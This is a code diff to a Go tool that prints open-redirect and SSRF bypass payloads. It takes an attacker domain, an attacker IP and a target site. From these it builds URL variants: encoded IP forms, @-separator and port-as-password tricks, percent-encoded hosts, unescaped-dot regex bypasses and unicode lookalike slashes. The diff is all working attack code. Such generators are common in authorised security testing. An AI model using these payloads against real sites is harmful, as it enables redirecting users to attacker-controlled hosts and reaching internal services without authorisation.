@@ -7,6 +7,7 @@ import (
 	"flag"
 	"fmt"
 	"net"
+	"net/url"
 	"os"
 	"strings"
 
@@ -31,9 +32,38 @@ func main() {
 	//chars that end the host part
 	endhostchars := []string{"/", "?", "\\", "#"}
 
-	hosts := []string{*attackerdomain}
+	//prepare hosts
+	ip := net.ParseIP(*attackerIP)
+	if ip == nil {
+		fmt.Fprintln(os.Stderr, "Couldn't parse IP")
+		return
+	}
+	ips := []string{ipfmt.ToInt(ip), ipfmt.ToHex(ip), ipfmt.ToOctal(ip), ipfmt.ToSingleHex(ip), ipfmt.Combo(ip), "1.1"}
+	hostnames := []string{*attackerdomain}
 
-	for _, domain := range hosts {
+	//contains
+	fmt.Println("https://" + *attackerdomain + "/" + *proto + *target + *path)
+
+	//% encoded
+	fmt.Println(url.QueryEscape(*proto + *attackerdomain))
+	fmt.Println(url.QueryEscape(url.QueryEscape(*proto + *attackerdomain)))
+
+	//port as pass
+	for _, host := range hostnames {
+		fmt.Println(*proto + *target + ":443@" + host + *path)
+	}
+
+	//mutliple @s
+	fmt.Println("https://" + *target + "@" + *target + "@" + *attackerdomain + *path)
+
+	// unescaped dots in regexes /www.target.tld/ -> wwwxtarget.tld
+	if hasSubdomain(*target) {
+		fmt.Println(*proto + strings.Replace(*target, ".", "x", 1) + *path)
+	} else {
+		fmt.Println(*proto + "wwwx" + *target + *path)
+	}
+
+	for _, domain := range hostnames {
 		//e.g. @attacker.tld
 		for _, seperator := range seperators {
 			fmt.Println(seperator + domain + *path)
@@ -44,59 +74,47 @@ func main() {
 		}
 	}
 
-	//Keep IPs and domains seperate for a while because we do not wanna generate .IP
-	ip := net.ParseIP(*attackerIP)
-	if ip == nil {
-		fmt.Fprintln(os.Stderr, "Couldn't parse IP")
-		return
-	}
-	ips := []string{ipfmt.ToInt(ip), ipfmt.ToHex(ip), ipfmt.ToOctal(ip), ipfmt.ToSingleHex(ip), ipfmt.Combo(ip), "1.1"}
 	for _, ip := range ips {
 		//e.g. @1.1
 		fmt.Println("@" + ip)
 	}
-	//Merge IPs and the other hosts
-	hosts = append(hosts, ips...)
 
 	//e.g. /\attacker.tld
-	for _, domain := range hosts {
-		for _, protocol := range protocols {
+	for _, protocol := range protocols {
+		for _, domain := range hostnames {
 			fmt.Println(protocol + domain + *path)
 		}
-	}
-	//contains
-	fmt.Println("https://" + *attackerdomain + "/" + *proto + *target + *path)
-	//port as pass
-	for _, host := range hosts {
-		fmt.Println(*proto + *target + ":443@" + host + *path)
-	}
-	//mutliple @s
-	fmt.Println("https://" + *target + "@" + *target + "@" + *attackerdomain + *path)
-	// unescaped dots in regexes /www.target.tld/ -> wwwxtarget.tld
-	if hasSubdomain(*target) {
-		fmt.Println(*proto + strings.Replace(*target, ".", "x", 1) + *path)
-	} else {
-		fmt.Println(*proto + "wwwx" + *target + *path)
-	}
-	//e.g. https://target.tld@attacker.tld
-	for _, seperator := range seperators {
-		hosts = append(hosts, *target+seperator+*attackerdomain)
-	}
-	//e.g. https://attacker.tld#.target.tld
-	for _, char := range endhostchars {
-		hosts = append(hosts, *attackerdomain+char+"."+*target)
-		//e.g. attacker.tld%EF%BC%8F.target.tld -> attacker.tld/.target.tld
-		for _, sub := range unicodesubstitutions[[]rune(char)[0]] {
-			hosts = append(hosts, *attackerdomain+string(sub)+"."+*target)
+		for _, ip := range ips {
+			fmt.Println(protocol + ip + *path)
 		}
 	}
+
+	//e.g. https://target.tld@attacker.tld
+	for _, seperator := range seperators {
+		hostnames = append(hostnames, *target+seperator+*attackerdomain)
+	}
+
+	//e.g. https://attacker.tld#.target.tld
+	for _, char := range endhostchars {
+		hostnames = append(hostnames, *attackerdomain+char+"."+*target)
+		//e.g. attacker.tld%EF%BC%8F.target.tld -> attacker.tld/.target.tld
+		for _, sub := range unicodesubstitutions[[]rune(char)[0]] {
+			hostnames = append(hostnames, *attackerdomain+string(sub)+"."+*target)
+		}
+	}
+
 	//e.g. https://target.tld&.attacker.tld
 	for _, char := range subdomainchars {
-		hosts = append(hosts, *target+char+"."+*attackerdomain)
+		hostnames = append(hostnames, *target+char+"."+*attackerdomain)
 	}
-	for _, domain := range hosts {
+
+	//e.g. https://attacker.tld
+	for _, domain := range hostnames {
 		fmt.Println(*proto + domain + *path)
 	}
+
+	//https://attacker.tld:target.tld this is more useful for ssrf
+	//fmt.Println(*proto + *attackerdomain + ":" + *target + *path)
 }
 
 func hasSubdomain(domain string) bool {
